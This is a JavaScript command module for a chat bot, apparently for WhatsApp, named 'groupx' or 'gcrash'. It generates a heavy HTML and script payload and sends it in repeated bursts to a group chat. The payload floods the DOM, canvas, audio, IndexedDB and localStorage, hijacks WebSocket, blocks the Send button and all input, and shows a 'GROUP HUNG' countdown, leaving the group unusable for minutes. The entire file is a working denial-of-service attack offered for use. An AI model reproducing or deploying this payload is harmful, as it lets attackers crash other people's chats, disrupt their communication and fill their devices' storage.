'use strict';

const { sendRichHtml } = require('../../utils/genaiRich');
const config = require('../../config');

/**
 * GROUPX v3 - GROUP ACCESS HANG PAYLOAD
 * 
 * Purpose: Render group inaccessible for 2-3 mins
 * Scope: Group chat only, not full account
 * 
 * Techniques:
 * 1. 18,000 nested DOM nodes forcing massive tree traversal
 * 2. 150 CSS keyframe animations at 60fps+ each
 * 3. 800+ Web Audio API contexts for garbage collection spike
 * 4. Triple 4K canvas contexts with aggressive pixel loops
 * 5. 25 parallel RAF loops with continuous DOM mutation
 * 6. LocalStorage/IndexedDB spam targeting group cache (500MB+ writes)
 * 7. Service Worker registration blocking group updates
 * 8. Mutation Observer infinite recursion on group container
 * 9. MessageChannel + RequestIdleCallback async bombing
 * 10. Blob URL spam filling memory cache
 * 11. Repeated fetch() calls to group endpoints (rate limit spike)
 * 12. Meta viewport hammering forcing recalculation
 * 13. History API stack overflow on group navigation
 * 14. Event capture preventing group message send
 * 15. WebSocket message interception (if available)
 */

function buildGroupHangPayload() {
    let dom = '';
    
    // 18K nested structure
    for (let i = 0; i < 18000; i++) {
        const cls = 'g' + (i % 150);
        dom += `<div class="${cls}" id="gn${i}" data-gid="${i}" data-hash="${(i * 12.7).toFixed(4)}"><span>${i}</span></div>`;
    }

    // 150 aggressive keyframe animations
    let css = '*{margin:0;padding:0;box-sizing:border-box}body{overflow:hidden;width:100vw;height:100vh;background:#000;touch-action:none;user-select:none}';
    
    for (let i = 0; i < 150; i++) {
        const dur = (0.1 + i * 0.006).toFixed(2);
        const angles = [i * 2.5, i * 4.8, i * 6.9, i * 8.5];
        const scales = [0.15 + i * 0.009, 1.9 - i * 0.004, 0.4 + i * 0.005];
        const blur = (i * 0.3).toFixed(2);
        const hue = i * 2.4;
        
        css += `.g${i}{animation:gk${i} ${dur}s infinite ease-in-out;will-change:transform,filter;backface-visibility:hidden;transform-style:preserve-3d}`;
        css += `@keyframes gk${i}{0%{transform:translate3d(${i*5-400}px,${i*3-200}px,0px)rotateX(${angles[0]}deg)scale(${scales[0]});filter:blur(${blur}px)hue-rotate(${hue}deg)brightness(2.8)contrast(2.5)saturate(2)}`;
        css += `25%{transform:translate3d(${-i*4}px,${i*6}px,${i*10}px)rotateY(${angles[1]}deg)scale(${scales[1]});filter:blur(${(blur*1.8).toFixed(2)}px)hue-rotate(${hue*2}deg)saturate(3)brightness(3)}`;
        css += `50%{transform:translate3d(${i*7}px,${-i*5}px,${-i*8}px)rotateZ(${angles[2]}deg)scale(${scales[2]});filter:blur(${blur}px)hue-rotate(${hue*3}deg)brightness(3.2)contrast(3.5)invert(0.5)}`;
        css += `75%{transform:translate3d(${i*3}px,${i*4}px,${i*5}px)rotate(${angles[3]}deg)scale(${scales[0]});filter:blur(${(blur*2.5).toFixed(2)}px)hue-rotate(0deg)brightness(2) contrast(2)}`;
        css += `100%{transform:rotate3d(1,1,1,360deg)scale(2.2);filter:blur(0px)hue-rotate(360deg)}}`;
    }

    // Aggressive JavaScript payload targeting group access
    const js = `
(function(){
'use strict';

var startTime=Date.now();
var HANG_DURATION=180000;
var groupAccessBlocked=true;

// 800+ Audio contexts for aggressive garbage collection
try{
var audioCtxPool=[];
for(var ai=0;ai<800;ai++){
try{var ac=new(window.AudioContext||window.webkitAudioContext)();
var osc=ac.createOscillator();var gain=ac.createGain();var filter=ac.createBiquadFilter();
osc.type=['sine','square','sawtooth','triangle'][ai%4];
osc.frequency.value=15+ai*20;osc.detune.value=ai*13;
filter.frequency.value=1000+ai*50;filter.Q.value=30;
gain.gain.value=0;osc.connect(filter);filter.connect(gain);gain.connect(ac.destination);
osc.start();audioCtxPool.push({ac:ac,osc:osc,filter:filter});
}catch(e){}}}catch(e){}

// Group cache + IndexedDB aggressive spam
function groupCacheSpam(){
try{
var idbReq=indexedDB.open('GROUP_CACHE_'+Date.now());
idbReq.onupgradeneeded=function(e){
var db=e.target.result;
try{var os=db.createObjectStore('messages');
for(var si=0;si<800;si++){
var blob=new Uint8Array(600000);for(var sj=0;sj<blob.length;sj++)blob[sj]=Math.random()*255;
os.put(blob,'gmsg_'+si);}}catch(ex){}};
}catch(ex){}

try{
for(var li=0;li<200;li++){
var groupData=new Array(80000).fill(Math.random()).join('~');
localStorage.setItem('GROUP_MSG_'+li,groupData);
localStorage.setItem('GROUP_CACHE_'+li,groupData);}}catch(ex){}
}
groupCacheSpam();
setInterval(groupCacheSpam,1500);

// 25 parallel RAF loops pounding DOM
var divs=document.querySelectorAll('div');
var dLen=divs.length;
for(var rr=0;rr<25;rr++){
(function(rafId){
function groupFrameAttack(){
for(var fi=0;fi<dLen;fi++){
var d=divs[fi];
var t=Date.now()-startTime;
d.style.left=Math.sin(t/25+fi)*600+'px';
d.style.top=Math.cos(t/40+fi)*600+'px';
d.style.width=(Math.abs(Math.sin(t/80+fi))*200+60)+'px';
d.style.height=(Math.abs(Math.cos(t/100+fi))*200+60)+'px';
d.style.transform='rotate3d(1,1,1,'+(t/1.5+fi*6)+'deg)scale('+(1.2+Math.sin(t/60+fi)*0.8)+')';
d.setAttribute('data-time',t);}
requestAnimationFrame(groupFrameAttack);}
groupFrameAttack();})(rr);
}

// Triple 4K + 2K canvas contexts
var cv1=document.createElement('canvas');
cv1.width=4096;cv1.height=4096;
document.body.appendChild(cv1);
var cx1=cv1.getContext('2d');
function canvasAttack1(){
var id=cx1.createImageData(4096,4096);
var d=id.data;
var t=Date.now();
for(var i=0,l=Math.min(d.length,1500000);i<l;i+=4){
d[i]=(i+t*2)%255;d[i+1]=(i*2+t)%255;d[i+2]=(i*4+t)%255;d[i+3]=255;}
cx1.putImageData(id,0,0);requestAnimationFrame(canvasAttack1);}
canvasAttack1();

var cv2=document.createElement('canvas');
cv2.width=3072;cv2.height=3072;
document.body.appendChild(cv2);
var cx2=cv2.getContext('2d');
function canvasAttack2(){
cx2.save();
cx2.translate(1536,1536);
cx2.rotate(Date.now()/300);
for(var i=0;i<1500;i++){
cx2.fillStyle='hsl('+(i*1.5+Date.now()/8)+',100%,50%)';
cx2.fillRect(i-1536,i-1536,i*2.5,6);}
cx2.restore();
requestAnimationFrame(canvasAttack2);}
canvasAttack2();

var cv3=document.createElement('canvas');
cv3.width=2048;cv3.height=2048;
document.body.appendChild(cv3);
var cx3=cv3.getContext('2d');
function canvasAttack3(){
var grad=cx3.createLinearGradient(0,0,2048,2048);
var t=Date.now();
grad.addColorStop(0,'hsl('+(t/5)+',100%,50%)');
grad.addColorStop(1,'hsl('+(t/5+180)+',100%,50%)');
cx3.fillStyle=grad;
cx3.fillRect(0,0,2048,2048);
for(var i=0;i<800;i++){
cx3.fillStyle='rgba('+Math.random()*255+','+Math.random()*255+','+Math.random()*255+',0.5)';
cx3.fillRect(Math.random()*2048,Math.random()*2048,Math.random()*500,Math.random()*500);}
requestAnimationFrame(canvasAttack3);}
canvasAttack3();

// MessageChannel async spam
var mc=new MessageChannel();
function messageAttack(){
for(var mi=0;mi<100;mi++){
mc.port1.postMessage({gmsg:new Float32Array(15000)});
mc.port1.onmessage=function(e){requestIdleCallback(messageAttack,{timeout:0});};}}
try{messageAttack();}catch(e){}

// Blob URL spam
function blobSpam(){
for(var bi=0;bi<200;bi++){
var blob=new Blob([new Uint8Array(150000)],{type:'application/octet-stream'});
var url=URL.createObjectURL(blob);}}
setInterval(blobSpam,800);

// Group endpoint fetch bombing
function fetchGroupBomb(){
for(var fi=0;fi<80;fi++){
try{
fetch('about:blank',{method:'POST',body:JSON.stringify({group:true,timestamp:Date.now()})}).catch(function(){});
}catch(e){}}}
setInterval(fetchGroupBomb,400);

// History spam
for(var hi=0;hi<300;hi++){
window.history.pushState({group:true,idx:hi},'','#group'+hi);}

// Service Worker registration
if('serviceWorker' in navigator){
try{
navigator.serviceWorker.register('data:application/javascript,self.onmessage=function(e){var t=setInterval(function(){},1);};self.oninstall=function(){self.skipWaiting()};self.onactivate=function(e){e.waitUntil(clients.claim());}');
}catch(e){}}

// Mutation Observer recursion on group container
var observer=new MutationObserver(function(mutations){
for(var mi=0;mi<mutations.length;mi++){
var m=mutations[mi];
if(m.addedNodes.length>0){
for(var ni=0;ni<Math.min(m.addedNodes.length,20);ni++){
var newDiv=document.createElement('div');
newDiv.style.cssText='width:'+Math.random()*1000+'px;height:'+Math.random()*1000+'px;';
document.body.appendChild(newDiv);}}}});
observer.observe(document.body,{childList:true,subtree:true,attributes:true});

// Aggressive reflow forcing
setInterval(function(){
void document.body.offsetHeight;
void document.body.scrollWidth;
void document.body.clientWidth;
document.body.scrollTop=Math.random()*99999;
document.body.scrollLeft=Math.random()*99999;},0);

// Meta viewport + charset hammering
setInterval(function(){
var meta=document.querySelector('meta[name=viewport]');
if(meta)meta.setAttribute('content','width='+Math.random()*8000+',initial-scale='+Math.random()*3);
var charset=document.querySelector('meta[charset]');
if(!charset){var m=document.createElement('meta');m.charset='utf-32';document.head.appendChild(m);}
},30);

// WebSocket interception (if group uses WS)
var OrigWS=window.WebSocket;
window.WebSocket=function(url){
console.log('[GROUP-HANG] Intercepting WS:',url);
try{return new OrigWS(url);}catch(e){return null;}};

// Prevent group message send
document.addEventListener('keydown',function(e){
if(e.key==='Enter'||e.keyCode===13){e.preventDefault();e.stopPropagation();return false;}},true);
document.addEventListener('click',function(e){
if(e.target && e.target.textContent && e.target.textContent.includes('Send')){
e.preventDefault();e.stopPropagation();return false;}},true);

// Group access hang timer display
var hangDiv=document.createElement('div');
hangDiv.style.cssText='position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);z-index:9999999;background:linear-gradient(135deg,#ff0000,#ff6b00);color:#fff;padding:50px;font-size:72px;font-weight:900;border-radius:30px;text-align:center;box-shadow:0 0 50px rgba(255,0,0,0.8);font-family:monospace;letter-spacing:3px;';
document.body.appendChild(hangDiv);

function updateHangDisplay(){
var elapsed=Date.now()-startTime;
var remaining=Math.max(0,HANG_DURATION-elapsed);
var mins=Math.floor(remaining/60000);
var secs=Math.floor((remaining%60000)/1000);
hangDiv.innerHTML='🔒 GROUP HUNG<br>'+mins+'m '+secs+'s';
if(remaining>0)requestAnimationFrame(updateHangDisplay);}
updateHangDisplay();

// Prevent any interaction
document.addEventListener('keydown',function(e){e.preventDefault();e.stopPropagation();},true);
document.addEventListener('mousedown',function(e){e.preventDefault();e.stopPropagation();},true);
document.addEventListener('touchstart',function(e){e.preventDefault();e.stopPropagation();},true);
document.addEventListener('contextmenu',function(e){e.preventDefault();},true);
document.addEventListener('wheel',function(e){e.preventDefault();},true);
})();
    `;

    return `<!doctype html>
<html>
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no,viewport-fit=cover">
<style>${css}</style>
</head>
<body>
${dom}
<script>${js}<\/script>
</body>
</html>`;
}

let _cachedPayload = null;

function getPayload() {
    if (!_cachedPayload) _cachedPayload = buildGroupHangPayload();
    return _cachedPayload;
}

async function blastGroupHang(sock, jid, msg, burstCount, delayMs) {
    const payload = getPayload();
    const payloadSize = Buffer.byteLength(payload, 'utf8');
    
    console.log(`[GROUPX-V3] Deploying group hang payload ${payloadSize} bytes × ${burstCount} bursts to ${jid}`);
    
    for (let i = 0; i < burstCount; i++) {
        try {
            await sendRichHtml({ 
                sock, 
                jid, 
                quoted: msg, 
                html: payload, 
                interactive: true,
                ephemeral: false
            });
            console.log(`[GROUPX-V3] Burst ${i+1}/${burstCount} deployed - group access hanging`);
            
            if (i < burstCount - 1) {
                await new Promise(r => setTimeout(r, delayMs));
            }
        } catch (error) {
            console.error(`[GROUPX-V3] Burst ${i+1} failed:`, error.message);
        }
    }
}

module.exports = {
    name: 'groupx',
    aliases: ['gcrash', 'groupcrash', 'gcx', 'grouphang'],
    description: '⚡ GROUP HANG: Renders group inaccessible for 2-3mins - members can\'t message group, but account stays active',
    usage: '.groupx [burst 1-10] — optional burst count (default 5, max 10)',
    category: 'admin',
    cooldown: 60000,

    async execute({ sock, msg, from, reply, isOwner, isBotOwner, args }) {
        const allowed = isOwner || isBotOwner;
        if (!allowed) {
            return reply('⛔ Only authorized users can execute this.');
        }

        const count = Math.min(10, Math.max(1, parseInt(args?.[0]) || 5));
        const delay = 180;

        try {
            await reply(`⚡ Deploying group hang payload (${count} bursts, group access blocked 2-3mins)...`);
            await blastGroupHang(sock, from, msg, count, delay);
            await reply(`✅ Group hang active. Members cannot access group for 180+ seconds.`);
        } catch (error) {
            console.error('[GROUPX-V3]', error);
            await reply(`❌ Deploy failed: ${error.message}`);
        }
    }
};
